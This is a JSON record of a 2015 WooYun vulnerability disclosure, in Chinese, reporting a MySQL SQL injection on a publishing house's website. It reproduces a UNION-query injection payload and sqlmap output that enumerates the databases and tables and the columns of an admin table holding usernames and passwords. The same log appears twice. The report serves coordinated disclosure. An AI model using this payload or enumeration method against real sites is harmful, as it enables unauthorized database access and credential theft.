{"id": 82508, "wybug_id": "wooyun-2015-0150849", "wybug_title": "某人民出版社MYSQL注入漏洞", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-11-01 21:57", "wybug_open_date": "2015-12-20 14:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-20：\t细节向公众公开  简要描述： 某人民出版社MYSQL注入漏洞 详细说明：  注入点：http://**.**.**.**/news_info.php?typeid=13&id=809通过sqlmap验证：\n[13:59:51] [INFO] GET parameter 'typeid' is 'MySQL UNION query (58) - 1 to 10 columns' injectableit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]GET parameter 'typeid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection point(s) with a total of 257 HTTP(s) requests:---Parameter: typeid (GET)    Type: UNION query    Title: MySQL UNION query (58) - 10 columns    Payload: typeid=-2639 UNION ALL SELECT 58,58,CONCAT(0x717a717a71,0x7a44535356575659634c,0x7176766271),58,58,58,58,58,58,58#&id=809---[14:00:44] [INFO] testing MySQL[14:01:05] [CRITICAL] unable to connect to the target URL or proxy. sqlmap is going to retry the request[14:01:11] [INFO] confirming MySQL[14:01:12] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17back-end DBMS: MySQL >= 5.0.0[14:01:12] [INFO] fetching database names[14:01:12] [INFO] the SQL query used returns 2 entries[14:01:22] [INFO] retrieved: information_schema[14:01:22] [INFO] retrieved: peopledataavailable databases [2]:[*] information_schema[*] peopledataDatabase: peopledata[8 tables]+------------------+| ceo_admin        || ceo_link         || ceo_list         || ceo_list_details || ceo_mboard       || ceo_type         || ceo_user         || web_basic_info   |+------------------+Database: peopledataTable: ceo_admin[12 columns]+-------------+--------------+| Column      | Type         |+-------------+--------------+| is_active   | int(11)      || u_id        | int(11)      || u_in_id     | int(11)      || user_date   | varchar(250) || user_email  | varchar(250) || user_mobile | varchar(250) || user_name   | varchar(50)  || user_pass   | varchar(50)  || user_qq     | varchar(250) || user_right  | varchar(250) || user_tel    | varchar(250) || user_zw     | varchar(250) |+-------------+--------------+\n   漏洞证明：  注入点：http://**.**.**.**/news_info.php?typeid=13&id=809通过sqlmap验证：\n[13:59:51] [INFO] GET parameter 'typeid' is 'MySQL UNION query (58) - 1 to 10 columns' injectableit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]GET parameter 'typeid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection point(s) with a total of 257 HTTP(s) requests:---Parameter: typeid (GET)    Type: UNION query    Title: MySQL UNION query (58) - 10 columns    Payload: typeid=-2639 UNION ALL SELECT 58,58,CONCAT(0x717a717a71,0x7a44535356575659634c,0x7176766271),58,58,58,58,58,58,58#&id=809---[14:00:44] [INFO] testing MySQL[14:01:05] [CRITICAL] unable to connect to the target URL or proxy. sqlmap is going to retry the request[14:01:11] [INFO] confirming MySQL[14:01:12] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17back-end DBMS: MySQL >= 5.0.0[14:01:12] [INFO] fetching database names[14:01:12] [INFO] the SQL query used returns 2 entries[14:01:22] [INFO] retrieved: information_schema[14:01:22] [INFO] retrieved: peopledataavailable databases [2]:[*] information_schema[*] peopledataDatabase: peopledata[8 tables]+------------------+| ceo_admin        || ceo_link         || ceo_list         || ceo_list_details || ceo_mboard       || ceo_type         || ceo_user         || web_basic_info   |+------------------+Database: peopledataTable: ceo_admin[12 columns]+-------------+--------------+| Column      | Type         |+-------------+--------------+| is_active   | int(11)      || u_id        | int(11)      || u_in_id     | int(11)      || user_date   | varchar(250) || user_email  | varchar(250) || user_mobile | varchar(250) || user_name   | varchar(50)  || user_pass   | varchar(50)  || user_qq     | varchar(250) || user_right  | varchar(250) || user_tel    | varchar(250) || user_zw     | varchar(250) |+-------------+--------------+\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-11-05 14:26 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发对应分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}